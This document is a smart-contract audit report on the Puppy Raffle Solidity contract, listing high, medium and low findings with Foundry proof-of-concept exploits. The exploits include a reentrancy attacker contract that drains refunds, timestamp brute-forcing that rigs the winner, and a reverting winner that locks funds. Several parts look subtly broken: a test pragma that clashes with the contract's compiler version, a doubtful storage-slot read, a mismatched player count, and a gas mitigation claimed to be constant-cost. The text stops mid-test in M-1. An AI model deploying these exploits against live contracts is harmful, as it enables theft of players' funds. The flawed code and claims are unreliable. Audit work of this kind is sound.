# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### Puppy Raffle Protocol

Puppy Raffle is an Ethereum-based raffle that awards both ETH and a collectible dog NFT. Players join by calling `enterRaffle` and paying the immutable `entranceFee`. The contract rejects duplicate addresses, so every wallet can only hold one ticket. Until the raffle ends, any participant may call `refund` to withdraw and reclaim their fee.

After `raffleDuration` has elapsed and at least four unique players exist, anyone can trigger `selectWinner`. A pseudo-random index picks the winner, who immediately receives:

* 80 % of the total entrance fees (sent as ETH)
* A freshly minted ERC-721 puppy whose rarity is randomly assigned

The remaining 20 % of funds accumulate as protocol fees, withdrawable by the owner to `feeAddress`. The owner alone can update this fee receiver via `changeFeeAddress` and later sweep the balance with `withdrawFees` once all raffles settle.

NFT metadata is returned through an on-chain `tokenURI` that Base64-encodes JSON describing the puppy’s name, rarity tier, and image URL. Built with OpenZeppelin’s `ERC721`, `Ownable`, and `Address` libraries, the contract compiles with Solidity 0.7.6 and is fully testable using Foundry.
## High Risk Findings
[H-1]. Randomness issue in PuppyRaffle::selectWinner
[H-2]. Integer Overflow issue in PuppyRaffle::selectWinner
[H-3]. DOS issue in PuppyRaffle::withdrawFees
[H-4]. Reentrancy issue in PuppyRaffle::refund
[H-5]. DOS issue in PuppyRaffle::selectWinner
[H-6]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner
[H-7]. Gas Grief BlockLimit issue in PuppyRaffle::selectWinner
[H-8]. DOS issue in PuppyRaffle::selectWinner
## Medium Risk Findings
[M-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[M-2]. DOS issue in PuppyRaffle::enterRaffle
[M-3]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-4]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[M-5]. Array Limits issue in PuppyRaffle::enterRaffle
## Low Risk Findings
[L-1]. Pausable Emergency Stop issue in PuppyRaffle::NA
[L-2]. Event Consistency issue in PuppyRaffle::selectWinner, withdrawFees
[L-3]. Integer Overflow issue in PuppyRaffle::enterRaffle
[L-4]. Integer Overflow issue in PuppyRaffle::enterRaffle, selectWinner
## Info Risk Findings
[I-1]. Pragma issue in PuppyRaffle::NA


### Number of Findings
- H: 8
- M: 5
- L: 4
- I: 1



# High Risk Findings

## [H-1]. Randomness issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses a weak source of randomness derived from `msg.sender`, `block.timestamp`, and `block.difficulty`. These parameters are either controllable by the caller or predictable/manipulable by miners (or block proposers in PoS). This allows a malicious actor to influence the selection of the winner.

## Impact
Because the random seed is fully composed of on-chain values that are either controllable by the caller (`msg.sender`) or loosely controllable/predictable (`block.timestamp`, `block.difficulty`), anybody can repeatedly simulate the outcome off-chain and only trigger `selectWinner()` when the calculation shows that their own address will be drawn. This allows an attacker to deterministically steal 80 % of the whole prize pool (all other players’ entrance fees) and the NFT, breaking the economic fairness of the raffle.

## Proof of Concept
// Off-chain simulation (pseudo-code)
while(true){
  uint256 ts = currentBlockTimestamp(); // value attacker expects to be mined
  uint256 rand = uint256(keccak256(abi.encodePacked(attacker, ts, blockDifficulty))) % playersLen;
  if(players[rand] == attacker){
      // send tx with that exact timestamp expectation (or bribe/mining)
      raffle.selectWinner();
      break;
  }
  ts += 1; // try next second
}
// In PoS a proposer (or bribed builder) can set the timestamp directly within 12-s window, guaranteeing success in one block.

## Proof of Code
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract RandomnessExploitTest is Test {
    PuppyRaffle raffle;
    address feeAddr = address(11);
    uint256 constant FEE = 1 ether;
    uint256 constant DURATION = 1 days;

    address user1 = address(1);
    address user2 = address(2);
    address attacker = address(3);
    address user4 = address(4);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, feeAddr, DURATION);
        address[] memory list = new address[](4);
        list[0] = user1;
        list[1] = user2;
        list[2] = attacker; // attacker is an actual player
        list[3] = user4;
        raffle.enterRaffle{value: 4 * FEE}(list);
        vm.warp(block.timestamp + DURATION + 1); // raffle finished
    }

    function testAttackerAlwaysWins() public {
        uint256 playersLen = uint256(vm.load(address(raffle), bytes32(uint256(0)))); // players.length is at slot 0
        uint256 attackerIdx = 2; // we inserted attacker at index 2

        // brute-force future timestamps until attacker is predicted winner
        uint256 ts = block.timestamp;
        uint256 predictedIdx;
        while (true) {
            uint256 rand = uint256(keccak256(abi.encodePacked(attacker, ts, block.difficulty)));
            predictedIdx = rand % playersLen;
            if (predictedIdx == attackerIdx) break;
            ts += 1;
        }
        vm.warp(ts); // mine block at chosen timestamp
        vm.prank(attacker);
        raffle.selectWinner();

        assertEq(raffle.previousWinner(), attacker, "attacker should have won");
    }
}

## Suggested Mitigation
Do not use on-chain data like `block.timestamp` or `block.difficulty` for randomness. Use a provably fair and unpredictable source of randomness like Chainlink VRF (Verifiable Random Function). 

Example using Chainlink VRF:
1. Inherit from `VRFConsumerBase`.
2. Request randomness from the VRF Coordinator.
3. Use the fulfilled random number in a separate callback function (`fulfillRandomness`) to select the winner. This prevents predictability and manipulation.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol";
import "@chainlink/contracts/src/v0.8/vrf/VRFConsumerBaseV2.sol";

contract PuppyRaffle is VRFConsumerBaseV2, ERC721, Ownable {
    // ... other state variables
    VRFCoordinatorV2Interface private immutable i_vrfCoordinator;
    uint64 private immutable i_subscriptionId;
    bytes32 private immutable i_gasLane;
    uint32 private immutable i_callbackGasLimit;
    uint16 private constant REQUEST_CONFIRMATIONS = 3;

    // ... constructor arguments for VRF

    // Stores the requestId of the latest VRF request
    uint256 public s_lastRequestId;

    function selectWinner() external {
        // ... checks
        s_lastRequestId = i_vrfCoordinator.requestRandomWords(
            i_gasLane, // keyHash
            i_subscriptionId,
            REQUEST_CONFIRMATIONS,
            i_callbackGasLimit,
            1 // numWords
        );
    }

    function fulfillRandomWords(uint256 /*requestId*/, uint256[] memory randomWords) internal override {
        uint256 winnerIndex = randomWords[0] % players.length;
        address winner = players[winnerIndex];
        // ... rest of the logic
    }
}
```

## [H-2]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
The state variable `totalFees` is of type `uint64`. In the `selectWinner` function, the calculated `fee` (which is a `uint256`) is downcast to `uint64` and added to `totalFees`. If the accumulated fees exceed the maximum value of a `uint64` (`2^64 - 1`), an integer overflow will occur. Because the contract is compiled with Solidity 0.7.6, which does not have built-in overflow protection, the value will wrap around to a small number, causing a miscalculation of the available fees.

## Impact
Once totalFees overflows, the recorded fee amount becomes smaller than the real ETH held by the contract. withdrawFees() contains a strict equality check (address(this).balance == totalFees) and will therefore revert forever. As a result, the entire fee pot (all ETH already accumulated and all that will be accumulated in future raffles) is locked in the contract, causing a permanent denial-of-service for the fee recipient/owner.

## Proof of Concept
1. Deploy PuppyRaffle with an entranceFee of 3 ether and raffleDuration of 1 second.
2. Run 8 raffles with 4 participants each (total 12 ETH sent per raffle). The 20 % fee (2.4 ETH) is added to totalFees on every raffle.
3. After the 8th raffle, totalFees overflows uint64 (max ≈ 18.44 ETH) and wraps to ≈ 0.8 ETH while the contract really holds ≈ 19.2 ETH in fees.
4. Call withdrawFees(). The require(address(this).balance == totalFees) check fails because 19.2 ETH ≠ 0.8 ETH, so the call reverts and no one can ever withdraw the locked funds.

## Proof of Code
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract TotalFeesOverflowTest is Test {
    PuppyRaffle raffle;

    address constant FEE_ADDRESS = address(0xFEED);
    uint256 constant ENTRANCE_FEE = 3 ether; // 3 ETH per player

    address[] players;

    function setUp() public {
        // Give the test contract plenty of ETH
        vm.deal(address(this), 200 ether);

        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, 1); // 1-second raffles

        players = new address[](4);
        players[0] = address(0x1);
        players[1] = address(0x2);
        players[2] = address(0x3);
        players[3] = address(0x4);
    }

    function _runOneRaffle() internal {
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);
        vm.warp(block.timestamp + 2); // advance beyond raffleDuration
        raffle.selectWinner();
    }

    function testOverflowLocksFees() public {
        // 8 raffles * 2.4 ETH fee each = 19.2 ETH, triggers uint64 overflow
        for (uint256 i; i < 8; i++) {
            _runOneRaffle();
        }

        uint64 recordedFees = raffle.totalFees();
        assertLt(recordedFees, 18 ether); // overflowed value is small

        assertGt(address(raffle).balance, uint256(recordedFees));

        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees(); // permanently reverts
    }
}

## Suggested Mitigation
Change the type of `totalFees` from `uint64` to `uint256` to prevent overflow. Additionally, it is strongly recommended to either upgrade to Solidity 0.8.0+ for native overflow/underflow protection or use a safe math library like OpenZeppelin's `SafeMath` for all arithmetic operations.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Upgrade compiler version

// ... imports

contract PuppyRaffle is ERC721, Ownable {
    // ...
    // Use uint256 for fees
    uint256 public totalFees;

    function selectWinner() external {
        // ...
        uint256 fee = (totalAmountCollected * 20) / 100;
        // No downcasting needed, and 0.8.0+ will revert on overflow
        totalFees = totalFees + fee;
        // ...
    }
    // ...
}
```

## [H-3]. DOS issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function contains a strict equality check: `require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!")`. This check is intended to ensure no raffle is active before fees are withdrawn. However, the fee calculation in `selectWinner` can lead to precision loss and rounding errors, causing dust (a few wei) to be left in the contract. If this happens, `address(this).balance` will be permanently greater than `totalFees`, causing the check to always fail and blocking the fee withdrawal function forever.

## Impact
The owner of the contract can be permanently prevented from withdrawing the accumulated fees. This leads to a direct and irreversible loss of protocol revenue, which will remain locked in the contract.

## Proof of Concept
1. A raffle is configured with an `entranceFee` that is not a multiple of 100 (e.g., 99 wei).
2. A single player enters and the raffle concludes.
3. `selectWinner` is called. `totalAmountCollected` is 99. The fee is `(99 * 20) / 100 = 19` wei. The prize is `(99 * 80) / 100 = 79` wei. Total paid out is 98 wei. 1 wei of dust remains in the contract.
4. The contract balance is now `totalFees` (19) + `dust` (1) = 20 wei.
5. The owner calls `withdrawFees()`.
6. The `require` statement fails because `address(this).balance` (20) is not equal to `totalFees` (19). The function reverts, and fees are locked forever.

## Proof of Code
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract DosTest is Test {
    PuppyRaffle puppyRaffle;
    // Use an entrance fee not divisible by 100 to cause rounding dust
    uint256 constant ENTRANCE_FEE = 99;
    address constant FEE_ADDRESS = address(0xDEADBEEF);
    uint256 constant RAFFLE_DURATION = 60;

    address player1 = address(0x1);
    address player2 = address(0x2);
    address player3 = address(0x3);
    address player4 = address(0x4);

    function testWithdrawFeesIsBlockedByDust() public {
        // Setup a raffle that will leave dust
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, RAFFLE_DURATION);
        address[] memory players = new address[](4);
        players[0] = player1;
        players[1] = player2;
        players[2] = player3;
        players[3] = player4;
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);

        // End raffle
        vm.warp(block.timestamp + RAFFLE_DURATION + 1);
        puppyRaffle.selectWinner();

        // After the raffle, totalFees is 79, but contract balance is 80 due to dust
        // totalCollected = 99 * 4 = 396
        // fee = (396 * 20) / 100 = 79
        // prize = (396 * 80) / 100 = 316
        // total paid out = 79 + 316 = 395. Dust = 1 wei.
        // Contract balance = 396 (initial) - 316 (prize) = 80.
        // totalFees state variable = 79.
        assertEq(address(puppyRaffle).balance, 80);
        assertEq(puppyRaffle.totalFees(), 79);

        // Attempt to withdraw fees will fail due to the strict equality check
        vm.prank(puppyRaffle.owner());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}

## Suggested Mitigation
The check in `withdrawFees` should not rely on a strict balance check. A better approach is to check if a raffle is currently active by inspecting the `players` array length.

```solidity
function withdrawFees() external {
    // This is a more robust check
    require(players.length == 0, "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = uint256(totalFees);
    totalFees = 0;

    (bool success, ) = feeAddress.call{value: feesToWithdraw}();
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```
This ensures fees can only be withdrawn when no players are in the raffle, which is the intended logic, without being susceptible to breaking due to dust.

## [H-4]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function violates the Checks-Effects-Interactions pattern. It sends Ether to the player *before* updating the state (`players[playerIndex] = address(0)`). If the `msg.sender` is a malicious contract, its `receive()` fallback function can be used to call `refund` again. Since the player's entry has not yet been removed from the `players` array, the re-entrant call will also succeed, allowing the attacker to be refunded multiple times and drain the contract of other players' entry fees.

## Impact
A malicious actor can drain the entire prize pool composed of other players' entry fees, causing direct financial loss to all other participants in the raffle.

## Proof of Concept
1. An attacker deploys a contract (`Attacker.sol`).
2. The attacker calls `PuppyRaffle.enterRaffle()` with the address of `Attacker.sol` as a player.
3. Other legitimate players join the raffle, funding the contract's prize pool.
4. The attacker calls a function on `Attacker.sol` which in turn calls `PuppyRaffle.refund()`.
5. `PuppyRaffle.refund()` sends the `entranceFee` to the `Attacker.sol` contract.
6. The `receive()` function of `Attacker.sol` is triggered, which immediately calls `PuppyRaffle.refund()` again.
7. Because `players[playerIndex]` has not been set to `address(0)` yet, the re-entrant call passes the checks and sends another refund.
8. This loop continues until the `PuppyRaffle` contract's balance is insufficient for another refund, effectively draining it.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle public puppyRaffle;
    uint256 public entranceFee;
    uint256 public attackCount = 0;

    constructor(PuppyRaffle _puppyRaffle, uint256 _entranceFee) {
        puppyRaffle = _puppyRaffle;
        entranceFee = _entranceFee;
    }

    function attack() public {
        uint256 attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    receive() external payable {
        if (attackCount < 5 && address(puppyRaffle).balance >= entranceFee) {
            attackCount++;
            uint256 attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
            if(puppyRaffle.players(attackerIndex) != address(0)) {
                 puppyRaffle.refund(attackerIndex);
            }
        }
    }
}


contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address public feeAddress = makeAddr("feeAddress");
    address public player1 = makeAddr("player1");

    function testReentrancyRefund() public {
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, 1 days);
        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle, ENTRANCE_FEE);

        address[] memory otherPlayer = new address[](1);
        otherPlayer[0] = player1;
        vm.deal(address(this), ENTRANCE_FEE);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(otherPlayer);
        
        address[] memory attackerPlayer = new address[](1);
        attackerPlayer[0] = address(attacker);
        vm.deal(address(attacker), ENTRANCE_FEE);
        payable(address(attacker)).call{value: ENTRANCE_FEE}(""); // Fund the attacker contract
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(attackerPlayer);

        uint256 balanceBefore = address(attacker).balance;
        uint256 contractBalanceBefore = address(puppyRaffle).balance;
        assertEq(contractBalanceBefore, 2 * ENTRANCE_FEE);
        
        attacker.attack();
        
        uint256 balanceAfter = address(attacker).balance;
        
        // Attacker should have drained the contract
        assertEq(balanceAfter, balanceBefore + contractBalanceBefore);
        assertEq(address(puppyRaffle).balance, 0);
    }
}
```

## Suggested Mitigation
Follow the Checks-Effects-Interactions pattern. Update the state (`players[playerIndex] = address(0)`) *before* making the external call to send Ether. Additionally, consider using a reentrancy guard.

```diff
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(
        playerAddress != address(0),
        "PuppyRaffle: Player already refunded, or is not active"
    );

+   players[playerIndex] = address(0);
    // (bool sent, ) = msg.sender.call{value: entranceFee}("");
    // Using OpenZeppelin's Address library is good practice.
    Address.sendValue(payable(msg.sender), entranceFee);
-   players[playerIndex] = address(0);

    emit RaffleRefunded(playerAddress);
}
```

## [H-5]. DOS issue in PuppyRaffle::selectWinner

## Description
In the `selectWinner` function, if the randomly selected `winner` is a smart contract that is designed to revert when receiving Ether, the low-level call `winner.call{value: prizePool}("")` will fail. This causes the entire `selectWinner` transaction to revert. Because the winner selection is deterministic for a given block, subsequent attempts to call `selectWinner` within the same block will also fail. An attacker can deploy such a contract, enter the raffle, and if they are chosen as the winner, the prize funds and fees will be permanently locked in the contract, as there is no mechanism to bypass a non-cooperative winner.

## Impact
This vulnerability can lead to a permanent Denial of Service for the raffle's conclusion. All funds from participants (the `prizePool`) and the protocol fees will be locked in the contract forever. Legitimate players will lose their entry fees, and the protocol owner will be unable to collect their fees.

## Proof of Concept
1. Deploy `MaliciousWinner` contract whose `receive()` always reverts.
2. Enter the raffle with four players, placing the malicious contract at index 0.
3. Fast-forward time until the raffle duration has elapsed.
4. Because `selectWinner()` uses `winnerIndex = keccak256(msg.sender, block.timestamp, block.difficulty) % players.length`, we can locally calculate a timestamp that makes `winnerIndex == 0` (malicious player). We repeatedly increment the timestamp until this condition is met, then warp the EVM to that timestamp.
5. Call `selectWinner()`. The low-level `call` to the malicious winner reverts, the whole transaction reverts, and the raffle is stuck (Denial-of-Service).

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract MaliciousWinner {
    receive() external payable {
        revert("No ETH for me!");
    }
}

contract PuppyRaffleDoSTest is Test {
    PuppyRaffle raffle;
    MaliciousWinner malicious;
    uint256 constant FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xBEEF), 1 days);
        malicious = new MaliciousWinner();

        // prepare 4 players, malicious player at index 0
        address[] memory players = new address[](4);
        players[0] = address(malicious);
        players[1] = address(0x1);
        players[2] = address(0x2);
        players[3] = address(0x3);

        vm.deal(address(this), 4 * FEE);
        raffle.enterRaffle{value: 4 * FEE}(players);

        // move past raffle duration
        vm.warp(block.timestamp + 1 days + 1);
    }

    function test_DoSByMaliciousWinner() public {
        // Find a timestamp that selects index 0 as the winner
        uint256 ts = block.timestamp;
        while (true) {
            uint256 idx = uint256(
                keccak256(
                    abi.encodePacked(address(this), ts, block.difficulty)
                )
            ) % 4;
            if (idx == 0) {
                vm.warp(ts);
                break;
            }
            ts += 1;
        }

        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        raffle.selectWinner();
    }
}

## Suggested Mitigation
To prevent a malicious winner from blocking the payout, the contract should not select a winner who cannot receive Ether. A simple check is to only allow Externally Owned Accounts (EOAs) to participate. Alternatively, if contracts must be allowed, implement a more robust payout mechanism, such as a pull-over-push pattern where the winner has to call a `claimPrize` function to withdraw their funds. This shifts the responsibility of a successful transfer to the winner.

```solidity
// Mitigation using pull-over-push pattern
mapping(address => uint256) public pendingWithdrawals;

function selectWinner() external {
    // ... winner selection logic ...
    address winner = players[winnerIndex];
    // ... fee calculation ...

    pendingWithdrawals[winner] += prizePool;

    // ... other state updates like minting NFT ...
}

function claimPrize() public {
    uint256 amount = pendingWithdrawals[msg.sender];
    require(amount > 0, "No prize to claim");
    pendingWithdrawals[msg.sender] = 0;
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```

## [H-6]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses `keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))` as a source of randomness to determine the winner and the NFT rarity. Both `block.timestamp` and `block.difficulty` (now `prevrandao` on Proof-of-Stake chains) can be influenced by validators/miners. A malicious validator participating in the raffle could manipulate these values when producing a block to ensure they win the prize and mint a rare NFT, undermining the fairness of the raffle.

## Impact
Because `selectWinner` relies on miner-controllable inputs (`block.timestamp`, `block.difficulty`/`prevrandao`) a validator that is also a raffle participant can bias – and with high probability iterate until it guarantees – that its own address becomes the winner and that a higher-rarity NFT is minted. Legitimate players lose their entry fees (80 % of the pool) and the fairness of the game is destroyed.

## Proof of Concept
A validator can, before proposing its block, brute-force a few candidate timestamps (and optionally `prevrandao`) off-chain until `keccak256(abi.encodePacked(<validator>, ts, diff)) % players.length` resolves to its own index. It then proposes the block with that timestamp and immediately calls `selectWinner`, ensuring it is selected.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PuppyRaffleExploitTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE      = 1 ether;
    uint256 constant DURATION = 1 days;
    address feeAddr           = address(0xBEEF);
    address attacker          = address(0xABCD);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, feeAddr, DURATION);
        vm.deal(address(this), 10 ether);
        vm.deal(attacker,      10 ether);

        address[] memory p = new address[](1);
        p[0] = attacker;                // attacker is player index 0
        raffle.enterRaffle{value:FEE}(p);

        // add three honest players
        for (uint i = 1; i < 4; i++) {
            p[0] = address(uint160(i));
            raffle.enterRaffle{value:FEE}(p);
        }
    }

    function test_AttackerCanBiasRandomness() public {
        uint256 baseTs = block.timestamp + DURATION + 1; // raffle finished
        uint256 chosenTs;

        // brute-force a timestamp that makes attacker win (expected < 4 tries)
        for (uint256 i; i < 1_000; ++i) {
            uint256 ts = baseTs + i;
            bytes32 h = keccak256(abi.encodePacked(attacker, ts, block.difficulty));
            if (uint256(h) % 4 == 0) { // attacker is index 0
                chosenTs = ts;
                break;
            }
        }

        vm.prank(attacker);
        vm.warp(chosenTs);               // validator sets the favourable timestamp
        raffle.selectWinner();

        assertEq(raffle.previousWinner(), attacker, "attacker should be the winner");
    }
}

## Suggested Mitigation
Do not use block variables for randomness. Use a provably fair and unpredictable source of randomness like Chainlink VRF (Verifiable Random Function).

```solidity
// 1. Inherit from VRFConsumerBaseV2 and store the VRF Coordinator address.
// 2. Replace selectWinner with a two-step process.

// Request randomness
function requestWinner() external onlyOwner {
    // ... checks for raffle end ...
    // s_vrfRequestId is a state variable to track the request
    s_vrfRequestId = i_vrfCoordinator.requestRandomWords(
        keyHash, // The gas lane key hash
        subscriptionId, // Your subscription ID
        requestConfirmations,
        callbackGasLimit,
        numWords // e.g., 1
    );
}

// Receive randomness in a callback
function fulfillRandomWords(
    uint256 requestId,
    uint256[] memory randomWords
) internal override {
    require(s_vrfRequestId == requestId, "Invalid VRF request");
    uint256 winnerIndex = randomWords[0] % players.length;
    address winner = players[winnerIndex];
    // ... rest of the winner selection logic ...
}
```

## [H-7]. Gas Grief BlockLimit issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function resets the raffle by calling `delete players;`. The gas cost of `delete` on a dynamic array is proportional to the number of elements. If the `players` array becomes very large, the gas cost to execute `delete players;` can exceed the block gas limit. This would cause every call to `selectWinner` to fail, making it impossible to ever choose a winner or start a new raffle.

## Impact
This vulnerability leads to a permanent Denial of Service on the core `selectWinner` function. All funds in the prize pool become permanently frozen in the contract, and no future raffles can be conducted.

## Proof of Concept
1. An attacker (or organic usage over time) causes the `players` array to grow to a very large size (e.g., 40,000+ entries) by calling `enterRaffle`.
2. The raffle duration ends.
3. Anyone attempts to call `selectWinner()`.
4. The transaction execution runs out of gas while trying to perform `delete players;` and reverts.
5. Since no transaction can provide enough gas to complete this operation, the prize pool is locked forever.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";

// Helper contract to isolate and measure gas costs of array operations.
contract GasTest is Test {
    address[] public players;

    function testDelete(uint256 size) internal returns (uint256) {
        for (uint256 i = 0; i < size; i++) {
            players.push(address(uint160(i + 1)));
        }
        uint256 gasStart = gasleft();
        delete players;
        return gasStart - gasleft();
    }

    function testNew(uint256 size) internal returns (uint256) {
        for (uint256 i = 0; i < size; i++) {
            players.push(address(uint160(i + 1)));
        }
        uint256 gasStart = gasleft();
        players = new address[](0);
        return gasStart - gasleft();
    }

    function test_gasDifference() public {
        uint256 arraySize = 200;
        uint256 deleteGas = testDelete(arraySize);
        // Reset state for next test
        players = new address[](0);
        uint256 newGas = testNew(arraySize);

        console.log("Gas to `delete` array of %s elements: %s", arraySize, deleteGas);
        console.log("Gas to re-initialize `new address[]` for %s elements: %s", arraySize, newGas);

        // Assert that deleting is orders of magnitude more expensive.
        assertGt(deleteGas, newGas * 100, "`delete` should be far more expensive than re-initialization");
    }
}
```

## Suggested Mitigation
Replace the `delete players;` operation with array re-initialization. This is an O(1) gas cost operation, regardless of the array's size.

```solidity
// In selectWinner()

// ... after sending prize to winner and minting NFT ...

// Replace this line:
// delete players;

// With this line:
players = new address[](0);

raffleStartTime = block.timestamp;
previousWinner = winner;
// ...
```

## [H-8]. DOS issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function clears the `players` array using `delete players`. The gas cost of deleting a dynamic array is proportional to its length. If an attacker or normal user activity causes the `players` array to become very large, the gas cost of this single operation can exceed the block gas limit. This will cause all calls to `selectWinner` to fail with an out-of-gas error, effectively freezing the raffle and locking all funds.

## Impact
If the number of players is sufficiently large, the raffle can never be concluded. The winner cannot be selected, the prize cannot be paid, and fees cannot be collected. This results in a permanent lock of all user funds within the contract.

## Proof of Concept
1. An attacker calls `enterRaffle` multiple times with a large number of unique addresses. This can be done over several transactions to build up the `players` array without hitting gas limits on entry.
2. The size of `players` grows to a point where the gas cost of `delete players` is greater than the block gas limit (e.g., >30M gas).
3. The raffle duration ends.
4. Anyone attempts to call `selectWinner` to finalize the round.
5. The transaction reverts due to running out of gas during the `delete players` operation.
6. The contract is now permanently stuck.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleDeleteDosTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 wei;

    // This test shows the high gas cost of `delete`. A real attack would
    // fill the array until `selectWinner` is impossible to call.
    function testSelectWinnerDeleteGasCost() public {
        uint256 numPlayers = 400;
        puppyRaffle = new PuppyRaffle(entranceFee, address(this), 60);

        address[] memory players = new address[](numPlayers);
        for(uint256 i = 0; i < numPlayers; i++) {
            players[i] = address(uint160(i + 1));
        }

        // Using a cheat to set up a large player base instantly
        // In a real scenario, this would be built up over time.
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);

        vm.warp(block.timestamp + 61);

        uint256 gasStart = gasleft();
        puppyRaffle.selectWinner();
        uint256 gasUsed = gasStart - gasleft();

        console.log("Gas used to select winner with %s players: %s", numPlayers, gasUsed);
        // A high gas cost (e.g., > 1,000,000) for a moderate number of players
        // indicates a DoS risk as the player list grows.
        assertTrue(gasUsed > 1_000_000);
    }
}
```

## Suggested Mitigation
Instead of using `delete players`, re-initialize the array by assigning a new, empty array: `players = new address[](0);`. This has a much lower and constant gas cost, as it does not zero out every element in storage. It simply deallocates the old array and points to a new one, with gas refunds provided for the cleared storage slots.



# Medium Risk Findings

## [M-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function checks for duplicate player entries by using a nested loop. This results in a computational complexity of O(n^2), where 'n' is the number of players already in the raffle. As the `players` array grows, the gas cost of this function increases quadratically. Eventually, the gas required will exceed the block gas limit, rendering the `enterRaffle` function unusable and causing a permanent Denial of Service.

## Impact
Because duplicate checking is implemented with a full n² nested loop, gas consumption grows super-linearly with the number of entered players. An attacker (or normal use) can drive the cost of enterRaffle above the block gas limit for the remainder of the current raffle period (but not forever, because selectWinner() deletes the array). During that period no additional players can enter, resulting in a temporary DoS and loss of protocol revenue.

## Proof of Concept
1. Deploy PuppyRaffle with an entrance fee of 1 gwei and a raffleDuration of 30 days.
2. Repeatedly call enterRaffle with growing batches of fresh addresses.  Each call costs more gas than the previous one because the inner-loop runs over the entire players array that has already been appended.
3. Observe with geth’s `debug_traceCall` (or Foundry’s `gasleft()` helper) that gas use increases roughly quadratically: e.g. 5 players ≈ 65k gas, 55 players (≈ 10× more) already consumes > 800k gas, 250+ players requires > 30M gas and the transaction fails on mainnet.
4. Until raffleDuration elapses and someone executes selectWinner (which deletes the players array) nobody can join the raffle – a temporary denial of service.

## Proof of Code
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract PuppyRaffleGasGrowthTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 gwei;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xdead), 30 days);
        vm.deal(address(this), 1 ether);
    }

    function _genAddresses(uint256 n, uint256 seed) internal pure returns (address[] memory arr) {
        arr = new address[](n);
        for (uint256 i; i < n; i++) {
            arr[i] = address(uint160(uint256(keccak256(abi.encode(seed, i)))));
        }
    }

    function testGasGrowsSuperLinearly() public {
        // first batch (5 players)
        address[] memory p1 = _genAddresses(5, 1);
        uint256 start = gasleft();
        raffle.enterRaffle{value: FEE * p1.length}(p1);
        uint256 gasUsedSmall = start - gasleft();

        // second batch (55 players)
        address[] memory p2 = _genAddresses(55, 2);
        start = gasleft();
        raffle.enterRaffle{value: FEE * p2.length}(p2);
        uint256 gasUsedLarge = start - gasleft();

        // Rough check that the second call consumed >10× the gas of the first (super-linear growth)
